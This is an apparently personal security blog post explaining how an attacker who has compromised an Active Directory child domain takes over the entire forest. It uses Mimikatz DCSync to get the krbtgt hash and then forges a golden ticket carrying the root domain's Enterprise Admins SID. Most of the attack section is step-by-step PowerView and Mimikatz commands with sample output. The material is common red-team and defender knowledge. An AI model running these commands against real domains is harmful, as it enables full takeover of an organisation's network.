---
title: "Jump between domains - Enterprise Admins Golden Ticket"
date: 2020-05-24T03:20:32+00:00
url: "/enterprise-admin-golden-ticket/"
draft: false
description: "How to take over all the domains. But let's add a quick recap first. To build an active directory domain, you start with a root domain, for example,..."
categories: ["blog", "exploit-dev", "Security"]
---

How to take over all the domains. But let's add a quick recap first.

To build an active directory domain, you start with a root domain, for example, UNIXAWY.CORP, which is the root domain/company, then you start a new branch or merge and acquisition a new company, then you want to extend your network for the branch-like us.unixawy. Corp, which is a different domain with its separate administrators, users, databases, etc. 

## Concepts

### Enterprise Admins

Enterprise admins is a particular group, and it does not exist in each domain of the forest, it only exists for the root domain where the users of these group can take control over subdomains.

### krbtgt - Golden Ticket

Golden ticket is well documented attack that allow the attacker to generate a ticket granting ticket tgt as anyuser by using the krbtgt hash. 

this attack usually executed after you compromise the domain controller or gain access to high privilege account 

## DCSync Attack

A remote protocol called Directory Replication Service, which an object with replication rights can request to synchronize with a target domain to act as a replica and get a full clone of the target domain.

### High-Level Plan

When a subdomain or child domain gets popped by attacker and krbtgt is leaked, the attacker can spoof any user or even can create a ticket to none exit user.  this is a power for the attacker, but a real adversary will take this attack to a different level by abusing the same concept and add a little bit of twist

When you generate a golden ticket, you specify the SID of the domain you compromised. Still, also, you can provide move SIDs for the user you are creating this ticket for. and here is the game, you can specify the SID of the enterprise admin group of the root domain.  this new ticket will have full administration rights over all the  child domains and the root domain

## Craft EA Golden for total domination

lets assume you compromised child domain "operators.unixawy.corp" and you domain domain and you was able to extract the krbtgt hash

#### Step one  - EA SID

First, we need to collect the Enterprise Admin group SID you don't need to have any permission over UNIXAWY.corp

```
PS C:\Windows\system32> Get-NetGroup -Domain UNIXAWY.CORP -GroupName "Enterprise Admins" -FullData|select objectsid

objectsid
---------
S-1-5-21-280534878-1938582341-966625481-519
```

#### Step two - Current Domain SID

by using Mimikatz, we can list the domain trust we have and get the SID for each domain including the current domain

```
mimikatz(powershell) # lsadump::trust 

Current domain: operators.UNIXAWY.CORP (opcorp / S-1-5-21-2349851236-9982960731-10393245)

Domain: UNIXAWY.CORP (UNICORP / S-1-5-21-280534878-1938582341-966625481)
```

#### Step three - Collect the krbtgt hash for the child domain

```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:opcorp\krbtgt"'
```

#### Step four - Create Golden Enterprise admin

```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /krbtgt:8b5ef256e66f97b39330ef3968b97864 /domain:operators.UNIXAWY.CORP /sid:S-1-5-21-2349851236-9982960731-10393245 /sids:S-1-5-21-280534878-1938582341-966625481-519 /ticket:c:\ea_golden_tgt.kirbi"'
```

**with the generated ticket you can now DCSync any child domain or the root domain :)**

One domain get compromised the full tree will get compromised!
